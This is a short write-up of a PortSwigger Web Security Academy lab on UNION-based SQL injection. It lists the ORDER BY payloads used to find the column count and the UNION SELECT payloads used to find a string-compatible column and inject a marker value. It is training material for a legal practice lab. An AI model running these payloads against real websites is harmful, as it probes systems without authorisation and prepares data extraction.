SQL Injection — UNION Attacks (PortSwigger)

Author: Divine Date: Today Platform: PortSwigger Web Security Academy


---

Lab 1: UNION Attack — Finding a Column Containing Text

🎯 Objective

Identify which column(s) returned by the original query can hold string data, then use that column to successfully complete a UNION-based SQL injection.


---

🧠 Thought Process

1. Determine the number of columns returned by the original query.


2. Identify which column(s) can store string values.


3. Place the required text value into a compatible column.




---

🔍 Steps Taken

1. Determine number of columns

' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

Result: The query returned 3 columns.

2. Identify string-compatible column

' UNION SELECT 'abc', NULL, NULL --
' UNION SELECT NULL, 'abc', NULL --
' UNION SELECT NULL, NULL, 'abc' --

Result: The 3rd column accepted string data.

3. Insert the required text The lab provided a specific string value to be displayed. Placing it in the 3rd column solved the lab.

' UNION SELECT NULL, NULL, '<623gmv>' --


---

🏁 Result

✅ Lab solved successfully by identifying the string-compatible column and injecting the provided value.


---

📝 Takeaways

UNION attacks require both correct column count and compatible data types.

Finding string-compatible columns is critical before extracting data.

Methodical testing beats guessing.

